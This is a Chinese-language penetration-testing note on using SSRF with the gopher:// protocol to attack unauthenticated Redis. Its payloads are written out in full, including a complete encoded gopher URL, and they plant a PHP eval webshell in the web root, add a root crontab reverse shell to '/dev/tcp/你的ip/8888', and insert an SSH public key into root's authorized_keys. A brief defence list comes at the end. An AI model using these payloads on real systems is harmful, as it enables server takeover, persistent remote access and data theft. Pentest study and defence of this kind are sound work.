# SSRF 通过 gopher 协议攻击 Redis
原理：gopher协议可以发送任意TCP数据流，SSRF调用gopher://向Redis服务（默认6379端口）发送原始Redis命令，实现写文件、反弹shell、写计划任务等。


## 前置条件
1. SSRF漏洞支持`gopher://`协议（很多环境会过滤，curl、部分php版本支持gopher）
2. Redis未设置密码 `requirepass`，无绑定IP限制（`bind 0.0.0.0`）
3. Redis服务可被SSRF服务器内网访问，通常 `127.0.0.1:6379`
4. gopher特点：url里面`\r\n`要做URL编码变成`%0d%0a`

## Redis原始命令示例（写webshell到web目录）
```redis
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x '<?php eval($_POST[cmd]);?>'
SAVE
```
Redis协议每条命令结束必须是`\r\n`，gopher要全部urlencode。

原始流：
```
*2
$6
CONFIG
$3
SET
$3
dir
$13
/var/www/html
*2
$6
CONFIG
$3
SET
$10
dbfilename
$8
shell.php
*3
$3
SET
$1
x
$25
<?php eval($_POST[cmd]);?>
*1
$4
SAVE
```

把所有换行替换为`%0d%0a`，拼接gopher链接：
```
gopher://127.0.0.1:6379/_*2%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*2%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0ashell.php%0d%0a*3%0d%0aSET%0d%0a$1%0d%0ax%0d%0a$25%0d%0a<?php eval($_POST[cmd]);?>%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```
> `gopher://ip:port/_` 下划线`_`后面就是TCP原始payload。

## 坑点1：Redis RESP协议格式
Redis使用RESP协议，不能直接裸写命令，必须严格按照：
- `*N` N代表参数个数
- `$len` 后面字符串长度，再跟字符串
如果格式错误Redis直接丢弃命令，攻击失效。

简单记忆：
```
SET key value
等价RESP:
*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n
```

## 坑点2：二次url编码问题
PHP SSRF场景，`file_get_contents()`会对gopher的url**再解码一次**。
所以payload需要**两次URL编码**。
第一次：`\r\n` →`%0d%0a`
第二次：把`%`编码成`%25`，即`%0d%0a`→`%250d%250a`。

示例：
原始gopher：
`gopher://127.0.0.1:6379/_CONFIG%0d%0aSET...`
二次编码后：
`gopher://127.0.0.1:6379/_CONFIG%250d%250aSET...`

不同SSRF函数行为不一样：
 - curl_exec：一次编码
 - file_get_contents / fopen：PHP会自动urldecode一次，需要二次编码。

## 利用方式2：写crontab计划任务（Linux）
Redis写计划任务路径 `/var/spool/cron/crontabs/root`
```redis
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET x "\n* * * * * /bin/bash -i >/dev/tcp/你的ip/8888 0>&1 2>&1 \n"
SAVE
```
转RESP再转gopher payload。

## 利用方式3：Redis未授权写ssh公钥
把公钥写入`/root/.ssh/authorized_keys`，实现ssh登录。
```redis
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAABxxx...公钥内容...xxx root@kali\n\n"
SAVE
```

## 常见失败原因排查
1. Redis设置密码：需要先发送`AUTH yourpass`命令放到payload头部
2. web目录权限不足，redis进程没有写权限
3. gopher被waf过滤，很多新版环境禁用gopher协议
4. payload只做一次编码，但PHP的file_get_contents会自动解码，导致`%0d%0a`变回普通字符，没有换行，Redis识别失败
5. Redis 禁止CONFIG命令（rename-command CONFIG ""），直接废掉写文件利用
6. Redis 快照禁用，无法执行SAVE/BGSAVE

## 测试小技巧
本地先验证redis原始TCP流是否有效：
```bash
# 直接tcp发送payload验证
echo -e "*2\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n" | nc 127.0.0.1 6379
```
确认Redis返回正确结果，再把payload转gopher。

## 防御
1. Redis设置强密码，禁止未授权访问
2. bind绑定127.0.0.1，禁止外网访问
3. rename‑command重命名CONFIG/SAVE危险命令
4. SSRF防护：黑名单禁用gopher://,dict://等协议，内网IP拦截
5. Redis运行普通低权限用户，不要root启动
